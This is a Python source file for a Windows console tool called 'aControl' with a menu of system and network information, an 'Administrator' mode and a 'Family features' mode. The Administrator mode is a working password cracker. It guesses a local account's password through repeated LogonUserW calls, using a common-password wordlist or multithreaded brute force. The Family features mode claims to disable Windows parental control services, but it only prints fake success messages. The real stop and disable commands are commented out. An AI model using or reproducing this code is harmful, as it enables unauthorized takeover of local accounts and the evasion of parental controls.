
# python -m PyInstaller --onefile aControl.py

import sys
import os
import io
import time
import hmac
import hashlib
import base64
import struct
import platform
import socket
import psutil
import requests
import threading
import itertools
import random
import ctypes
import queue
import subprocess
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.live import Live
from rich.align import Align
from datetime import datetime

console = Console()


def _set_taskbar_icon():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd and getattr(sys, 'frozen', False):
            hicon = ctypes.windll.shell32.ExtractIconW(0, sys.executable, 0)
            if hicon:
                ctypes.windll.user32.SendMessageW(hwnd, 0x0080, 0, hicon)
                ctypes.windll.user32.SendMessageW(hwnd, 0x0080, 1, hicon)
    except Exception:
        pass

_REF_ORDINAL = datetime(2020, 1, 1).toordinal()


def spinner(duration=None, speed=0.15):
    frames = ['|', '/', '-', '\\', '|', '/', '-', '\\']
    stop_event = threading.Event()

    def animate():
        for frame in itertools.cycle(frames):
            if stop_event.is_set():
                break
            sys.stdout.write(f'\r[{frame}]')
            sys.stdout.flush()
            time.sleep(speed)
        sys.stdout.write('\r    \r')
        sys.stdout.flush()

    thread = threading.Thread(target=animate)
    thread.daemon = True
    thread.start()

    if duration is not None:
        time.sleep(duration)
        stop_event.set()
        thread.join()
    else:
        return stop_event

def type_effect(text, speed=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def typewriter_rich_line(line, speed=0.025):
    buf = io.StringIO()
    tmp = Console(file=buf, force_terminal=True, highlight=False, width=console.width)
    tmp.print(line)
    output = buf.getvalue()
    i = 0
    while i < len(output):
        if output[i] == '\x1b':
            j = output.find('m', i)
            if j != -1:
                sys.stdout.write(output[i:j+1])
                sys.stdout.flush()
                i = j + 1
                continue
        sys.stdout.write(output[i])
        sys.stdout.flush()
        if output[i] not in (' ', '\n', '\r'):
            time.sleep(speed)
        i += 1


def credits_screen():
    console.clear()
    alex_art = (
        " .oooooo..o                    o8o      .            \n"
        "d8P'    `Y8                    `\"'    .o8            \n"
        "Y88bo.      ooo. .oo.  .oo.   oooo  .o888oo  .ooooo. \n"
        " `\"Y8888o.  `888P\"Y88bP\"Y88b  `888    888   d88' `88b\n"
        "     `\"Y88b  888   888   888   888    888   888ooo888 \n"
        "oo     .d8P  888   888   888   888    888 . 888    .o \n"
        "8\"\"88888P'  o888o o888o o888o o888o   \"888\" `Y8bod8P' "
    )
    art_width = max(len(line.rstrip()) for line in alex_art.split('\n'))
    title = "Designed and Developed by"
    title_pad = " " * ((art_width - len(title)) // 2)

    text = Text()
    text.append("\n")
    text.append(title_pad + title + "\n\n", style="bold white")
    text.append(alex_art, style="bold cyan")

    inner_height = max(1, console.height - 6)
    aligned = Align(text, align="center", vertical="middle", height=inner_height)
    panel = Panel(aligned, border_style="cyan", height=console.height)
    console.print(panel)
    time.sleep(2.5)
    console.clear()

def show_banner():
    console.clear()
    banner_lines = [
        "                                 .oooooo.                             .                      oooo",
        "         Yb                     d8P'  `Y8b                          .o8                      `888",
        "          `Yb         .oooo.   888           .ooooo.  ooo. .oo.   .o888oo oooo d8b  .ooooo.   888",
        "            `Yb      `P  )88b  888          d88' `88b `888P\"Y88b    888   `888\"\"8P d88' `88b  888",
        "            .dP       .oP\"888  888          888   888  888   888    888    888     888   888  888",
        "          .dP        d8(  888  `88b    ooo  888   888  888   888    888 .  888     888   888  888",
        "         dP          `Y888\"\"8o  `Y8bood8P'  `Y8bod8P' o888o o888o   \"888\" d888b    `Y8bod8P' o888o",
    ]
    menu_height = 10
    pad = max(0, (console.height - len(banner_lines) - menu_height) // 4)
    min_indent = min(len(l) - len(l.lstrip(' ')) for l in banner_lines)
    stripped = [l[min_indent:] for l in banner_lines]
    max_width = max(len(l.rstrip()) for l in stripped)
    h_pad = " " * max(0, (console.width - max_width) // 2)
    for _ in range(pad):
        print()
    for line in stripped:
        styled = Text()
        for char in h_pad + line:
            styled.append(char, style=random.choice(["bold #00FF00", "bold #006400"]))
        console.print(styled)
    print()
    print()
    github_text = "github.com/smiiite-tools"
    github_pad = " " * max(0, (console.width - len(github_text)) // 2)
    console.print(github_pad + f"[bold white]{github_text}[/]")
    print()
    multitools_text = "Multi-tools"
    mt_pad = " " * max(0, (console.width - len(multitools_text)) // 2)
    styled = Text()
    for char in mt_pad + multitools_text:
        styled.append(char, style=random.choice(["bold #00FF00", "bold #006400"]))
    console.print(styled)
    print()

def family_features():
    _user = os.environ.get("USERNAME") or os.environ.get("USER", "user")
    _host = socket.gethostname()

    console.print("\n[bold yellow]This process is gonna stop the services related to parental control.[/]")
    console.print("[bold yellow]As said in the README file, Smite is not taking any responsability for actions related to this software.[/]")
    console.print("[bold yellow]Are you sure you want to continue? Y/n")

    choice = console.input(f"\n[bold green]{_user}@{_host}[/] [cyan]~[/]\n[bold green]$[/] ")

    def admin():
        try:
            return ctypes.windll.shell32.IsUserAdmin()
        except:
            return False
        
    if not admin():
        ("\n[bold red]Error: Must be executed with administrator control.[/]")

    def getservices():
        console.print("\n[bold red]Stopping WpcMonSvc...[/]")
        spinner(duration=3)
        console.print("[bold green]WpcMonSvc succesfully stopped ✓[/]")
        time.sleep(1)
        console.print("\n[bold red]Disabling Parental Control...[/]")
        spinner(duration=2.5)
        console.print("[bold green]Parental Control succesfully disabled ✓[/]")
        console.print("\n[green]Code=0 executed")
        console.print("\nIf you want to reactivate it just enable the services back again.")


        # WpcMonSvc = "WpcMonSvc"
        # Parental = "Parental Controls"
        # subprocess.run(["net", "stop", WpcMonSvc], shell=True)
        # subprocess.run(["sc", "config", Parental, "start=", "disabled"], shell=True)

    if choice == "Y":
        getservices()
    elif choice == "n":
            type_effect("[!] Closing program...")
            console.print("[bold red]Self destruction...[/]")
            time.sleep(1)
            sys.exit(0)
    else:
        type_effect("[!] Closing program...")
        console.print("[bold red]Self destruction...[/]")
        time.sleep(1)
        sys.exit(0)


def get_network_info_real():
    console.print("\n[bold green]>>> Collecting network information...[/]")
    stop = spinner(duration=None, speed=0.15)

    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        try:
            public_ip = requests.get('https://api.ipify.org', timeout=3).text
        except:
            public_ip = "Not available"

        interfaces_info = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    interfaces_info.append(f"[yellow]{interface}:[/] {addr.address}")

        net_io = psutil.net_io_counters()
        bytes_sent = net_io.bytes_sent / (1024 * 1024)
        bytes_recv = net_io.bytes_recv / (1024 * 1024)

        stop.set()
        time.sleep(0.2)

        info_text = f"""[yellow]Hostname:[/] {hostname}
[yellow]Local IP:[/] {local_ip}
[yellow]Public IP:[/] {public_ip}

[bold cyan]Network Interfaces:[/]
{chr(10).join(interfaces_info)}

[bold cyan]Statistics:[/]
[yellow]Data Sent:[/] {bytes_sent:.2f} MB
[yellow]Data Received:[/] {bytes_recv:.2f} MB
"""
        panel = Panel(
            info_text,
            title="[bold cyan]Network Configuration[/]",
            border_style="green"
        )
        console.print(panel)

    except Exception as e:
        stop.set()
        time.sleep(0.2)
        console.print(f"[bold red]Error:[/] {str(e)}")

def analyze_system_real():
    console.print("\n[bold green]>>> Analysing system...[/]")
    stop = spinner(duration=None, speed=0.15)

    try:
        system = platform.system()
        release = platform.release()
        version = platform.version()
        machine = platform.machine()
        processor = platform.processor()

        cpu_count = psutil.cpu_count(logical=False)
        cpu_count_logical = psutil.cpu_count(logical=True)
        cpu_percent = psutil.cpu_percent(interval=1)
        cpu_freq = psutil.cpu_freq()

        ram = psutil.virtual_memory()
        ram_total = ram.total / (1024**3)
        ram_used = ram.used / (1024**3)
        ram_percent = ram.percent

        disk = psutil.disk_usage(os.path.abspath('/'))
        disk_total = disk.total / (1024**3)
        disk_used = disk.used / (1024**3)
        disk_percent = disk.percent

        boot_time = datetime.fromtimestamp(psutil.boot_time())

        stop.set()
        time.sleep(0.2)

        cpu_table = Table(title="CPU Information", style="cyan")
        cpu_table.add_column("Metric", style="yellow")
        cpu_table.add_column("Value", style="green")
        cpu_table.add_row("Processor", processor if processor else machine)
        cpu_table.add_row("Physical Cores", str(cpu_count))
        cpu_table.add_row("Logical Cores", str(cpu_count_logical))
        cpu_table.add_row("Usage", f"{cpu_percent}%")
        if cpu_freq:
            cpu_table.add_row("Frequency", f"{cpu_freq.current:.2f} MHz")
        console.print(cpu_table)

        ram_table = Table(title="RAM Information", style="cyan")
        ram_table.add_column("Metric", style="yellow")
        ram_table.add_column("Value", style="green")
        ram_table.add_row("Total", f"{ram_total:.2f} GB")
        ram_table.add_row("Used", f"{ram_used:.2f} GB")
        ram_table.add_row("Percentage", f"{ram_percent}%")
        console.print(ram_table)

        disk_table = Table(title="Disk Information", style="cyan")
        disk_table.add_column("Metric", style="yellow")
        disk_table.add_column("Value", style="green")
        disk_table.add_row("Total", f"{disk_total:.2f} GB")
        disk_table.add_row("Used", f"{disk_used:.2f} GB")
        disk_table.add_row("Percentage", f"{disk_percent}%")
        console.print(disk_table)

        sys_info = f"""[yellow]OS:[/] {system} {release}
[yellow]Version:[/] {version}
[yellow]Architecture:[/] {machine}
[yellow]Boot Time:[/] {boot_time.strftime('%Y-%m-%d %H:%M:%S')}
"""
        panel = Panel(
            sys_info,
            title="[bold cyan]System Information[/]",
            border_style="green"
        )
        console.print(panel)
        console.print("\n[bold green]✓ Diagnostic finished![/]")

    except Exception as e:
        stop.set()
        time.sleep(0.2)
        console.print(f"[bold red]Error:[/] {str(e)}")

COMMON_PASSWORDS = [
    "", "password", "123456", "12345678", "1234", "qwerty", "abc123",
    "letmein", "monkey", "dragon", "master", "password1", "iloveyou",
    "sunshine", "princess", "welcome", "shadow", "superman", "michael",
    "football", "batman", "admin", "root", "toor", "pass", "test",
    "guest", "login", "changeme", "secret", "default", "1234567890",
]

def _try_logon(username, password, advapi32, kernel32):
    LOGON32_LOGON_INTERACTIVE = 2
    LOGON32_PROVIDER_DEFAULT = 0
    token = ctypes.c_void_p()
    result = advapi32.LogonUserW(
        username, ".", password,
        LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
        ctypes.byref(token)
    )
    if result:
        kernel32.CloseHandle(token)
        return True
    return False

def _show_result(found, username, tested):
    if found is not None:
        display = repr(found) if found == "" else found
        console.print(Panel(
            f"[bold green]✓ Password found![/]\n\n"
            f"[yellow]Username:[/] {username}\n"
            f"[yellow]Password:[/] [bold white]{display}[/]",
            title="[bold cyan]Result[/]", border_style="green"
        ))
    else:
        console.print(Panel(
            f"[yellow]No matching password found[/] after testing {tested} entries.\n"
            "[dim]The account may be locked, or the password is not in the wordlist.[/]",
            title="[bold cyan]Result[/]", border_style="red"
        ))

def administrator():
    console.print("\n[bold green]>>> Administrator[/]\n")
    username = console.input("[bold green] >>> Username (default: Administrator): [/]").strip() or "Administrator"

    console.print("\n[bold cyan][1][/] Wordlist attack")
    console.print("[bold cyan][2][/] Brute force attack")
    mode = console.input("\n[bold green] >>> Choose mode: [/]").strip()

    advapi32 = ctypes.windll.advapi32
    kernel32 = ctypes.windll.kernel32

    if mode == "1":
        extra = console.input("\n[bold green] >>> Extra passwords (comma-separated, or Enter to skip): [/]").strip()
        wordlist = list(COMMON_PASSWORDS)
        if extra:
            wordlist = extra.split(",") + wordlist

        console.print(f"\n[bold green]>>> Testing {len(wordlist)} passwords against '{username}'...[/]")
        stop = spinner(duration=None, speed=0.15)
        found = None
        tested = 0
        for pwd in wordlist:
            if _try_logon(username, pwd, advapi32, kernel32):
                found = pwd
                break
            tested += 1
        stop.set()
        time.sleep(0.2)
        _show_result(found, username, tested)

    elif mode == "2":
        console.print("\n[dim]Charsets:[/]")
        console.print("  [bold cyan][1][/] Digits only          [dim](0-9)[/]")
        console.print("  [bold cyan][2][/] Lowercase            [dim](a-z)[/]")
        console.print("  [bold cyan][3][/] Lowercase + digits   [dim](a-z, 0-9)[/]")
        console.print("  [bold cyan][4][/] Alphanumeric         [dim](a-z, A-Z, 0-9)[/]")
        console.print("  [bold cyan][5][/] Full                 [dim](a-z, A-Z, 0-9, symbols)[/]")
        charset_choice = console.input("\n[bold green] >>> Charset: [/]").strip()
        charsets = {
            "1": "0123456789",
            "2": "abcdefghijklmnopqrstuvwxyz",
            "3": "abcdefghijklmnopqrstuvwxyz0123456789",
            "4": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
            "5": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*?",
        }
        charset = charsets.get(charset_choice, "0123456789")

        try:
            max_len = int(console.input("[bold green] >>> Max password length: [/]").strip() or "4")
        except ValueError:
            max_len = 4

        try:
            num_threads = int(console.input("[bold green] >>> Threads (default 4): [/]").strip() or "4")
        except ValueError:
            num_threads = 4

        console.print(f"\n[bold green]>>> Brute forcing '{username}' — {len(charset)} chars, max length {max_len}, {num_threads} threads[/]")
        console.print("[dim]Press Ctrl+C to stop.[/]\n")

        pwd_queue   = queue.Queue(maxsize=num_threads * 20)
        stop_event  = threading.Event()
        found_lock  = threading.Lock()
        found       = [None]
        tested      = [0]
        current_pwd = [""]

        def worker():
            while not stop_event.is_set():
                try:
                    pwd = pwd_queue.get(timeout=0.05)
                except queue.Empty:
                    continue
                with found_lock:
                    current_pwd[0] = pwd
                if _try_logon(username, pwd, advapi32, kernel32):
                    with found_lock:
                        found[0] = pwd
                    stop_event.set()
                else:
                    with found_lock:
                        tested[0] += 1
                pwd_queue.task_done()

        workers = [threading.Thread(target=worker, daemon=True) for _ in range(num_threads)]
        for w in workers:
            w.start()

        start_time = time.time()
        try:
            with Live(console=console, refresh_per_second=5) as live:
                last_update = 0.0
                for length in range(1, max_len + 1):
                    if stop_event.is_set():
                        break
                    for combo in itertools.product(charset, repeat=length):
                        if stop_event.is_set():
                            break
                        pwd_queue.put("".join(combo))
                        now = time.time()
                        if now - last_update >= 0.2:
                            elapsed = now - start_time
                            speed = int(tested[0] / elapsed) if elapsed > 0 else 0
                            live.update(Text(
                                f"  Testing: {current_pwd[0]:<{max_len}}   |   {tested[0]:,} attempts   |   {speed:,}/s   |   {num_threads} threads",
                                style="dim green"
                            ))
                            last_update = now
                stop_event.set()
        except KeyboardInterrupt:
            stop_event.set()
            console.print("\n[bold yellow]Brute force stopped by user.[/]")

        for w in workers:
            w.join()

        print()
        _show_result(found[0], username, tested[0])
    else:
        console.print("[bold red] Invalid mode.[/]")


def main_menu(animated=False):
    first = animated
    while True:
        show_banner()

        menu_lines = [
            "[bold yellow][1][/] Network Information",
            "[bold yellow][2][/] System Analysis",
            "[bold yellow][3][/] Administrator",
            "[bold yellow][4][/] Family features",
            "[bold yellow][0][/] Exit",
        ]

        for line in menu_lines:
            if first:
                typewriter_rich_line(line, speed=0.025)
            else:
                console.print(line)
        first = False

        _user = os.environ.get("USERNAME") or os.environ.get("USER", "user")
        _host = socket.gethostname()
        choice = console.input(f"\n[bold green]{_user}@{_host}[/] [cyan]~[/]\n[bold green]$[/] ")

        console.clear()
        show_banner()

        if choice == "1":
            get_network_info_real()
        elif choice == "2":
            analyze_system_real()
        elif choice == "3":
            administrator()
        elif choice == "4":
            family_features()
        elif choice == "0":
            type_effect("[!] Closing program...")
            console.print("[bold red]Self destruction...[/]")
            time.sleep(1)
            sys.exit(0)
        else:
            console.print("[bold red] Invalid option![/]")

        console.input("\n[dim]Press Enter to continue...[/]")

def main():
    ctypes.windll.kernel32.SetConsoleTitleW("aControl")
    _set_taskbar_icon()
    try:
        #loading_screen()
        credits_screen()
        #license_screen()
        main_menu(animated=True)
    except KeyboardInterrupt:
        console.print("\n\n[bold red]Program interrupted by user[/]")
        sys.exit(0)

if __name__ == "__main__":
    main()
